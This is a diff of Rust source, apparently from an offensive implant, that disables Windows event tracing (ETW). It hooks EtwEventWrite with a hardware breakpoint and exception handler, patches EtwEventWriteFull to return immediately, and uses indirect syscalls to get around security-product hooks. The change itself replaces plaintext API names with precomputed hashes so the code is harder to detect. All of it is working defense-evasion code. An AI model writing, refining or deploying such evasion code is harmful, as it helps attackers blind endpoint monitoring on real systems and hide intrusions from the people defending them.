@@ -23,20 +23,19 @@ unsafe fn ntdll_base() -> *const u8 {
 
 #[cfg(target_os = "windows")]
 pub unsafe fn install_etw_bypass() {
-    use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};
+    use crate::resolve::api_hash::{h, resolve_by_hash};
     let ntdll = ntdll_base();
     if ntdll.is_null() { return; }
-    let etw_fn = match resolve_by_hash(ntdll, djb2_hash(b"EtwEventWrite")) {
+    let etw_fn = match resolve_by_hash(ntdll, h::ETW_EV_WRITE) {
         Some(p) => p,
         None => return,
     };
     ETW_ADDR = etw_fn as usize;
 
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
     #[cfg(target_arch = "x86_64")]
     {
-        use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};
-        if let Some(fn_ptr) = resolve_by_hash(ntdll, djb2_hash(b"RtlAddVectoredExceptionHandler")) {
+        if let Some(fn_ptr) = resolve_by_hash(ntdll, h::RTL_VEH) {
             type RtlVeh = unsafe extern "system" fn(usize, *const core::ffi::c_void) -> *mut core::ffi::c_void;
             let f: RtlVeh = core::mem::transmute(fn_ptr);
             f(1, etw_veh_handler as usize as *const core::ffi::c_void);
@@ -48,12 +47,12 @@ pub unsafe fn install_etw_bypass() {
     let thread: isize = !1isize; // -2 = current thread pseudo-handle
     let mut ctx: CONTEXT = core::mem::zeroed();
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
-    if let Some((ssn_get, tramp_get)) = get_ssn(b"NtGetContextThread") {
+    if let Some((ssn_get, tramp_get)) = get_ssn_h(h::NT_GET_CTX) {
         indirect_syscall(ssn_get, tramp_get, thread as usize, &mut ctx as *mut CONTEXT as usize, 0, 0, 0, 0);
     }
     ctx.Dr1  = ETW_ADDR as u64;
     ctx.Dr7 |= 0x4;
-    if let Some((ssn_set, tramp_set)) = get_ssn(b"NtSetContextThread") {
+    if let Some((ssn_set, tramp_set)) = get_ssn_h(h::NT_SET_CTX) {
         indirect_syscall(ssn_set, tramp_set, thread as usize, &ctx as *const CONTEXT as usize, 0, 0, 0, 0);
     }
 }
@@ -62,13 +61,13 @@ pub unsafe fn install_etw_bypass() {
 /// Uses NtProtectVirtualMemory indirect syscall to avoid VirtualProtect hook.
 #[cfg(target_os = "windows")]
 pub unsafe fn patch_etw_full() {
-    use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    use crate::resolve::api_hash::{h, resolve_by_hash};
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
 
     let ntdll = ntdll_base();
     if ntdll.is_null() { return; }
 
-    let func = match resolve_by_hash(ntdll, djb2_hash(b"EtwEventWriteFull")) {
+    let func = match resolve_by_hash(ntdll, h::ETW_EV_WR_FULL) {
         Some(p) => p as *mut u8,
         None    => return,
     };
@@ -76,7 +75,7 @@ pub unsafe fn patch_etw_full() {
     let patch = [0x33u8, 0xC0, 0xC3]; // xor eax,eax; ret
     let ph    = usize::MAX;
 
-    if let Some((prot_ssn, prot_tramp)) = get_ssn(b"NtProtectVirtualMemory") {
+    if let Some((prot_ssn, prot_tramp)) = get_ssn_h(h::NT_PROT_VM) {
         let mut base = func as usize; let mut sz = patch.len(); let mut old = 0u32;
         indirect_syscall(prot_ssn, prot_tramp, ph,
             &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
@@ -87,7 +86,6 @@ pub unsafe fn patch_etw_full() {
             &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
             old as usize, &mut old as *mut u32 as usize, 0);
     } else {
-        // Fallback: write without changing permissions (may fault on RX memory)
         core::ptr::copy_nonoverlapping(patch.as_ptr(), func, patch.len());
     }
 }
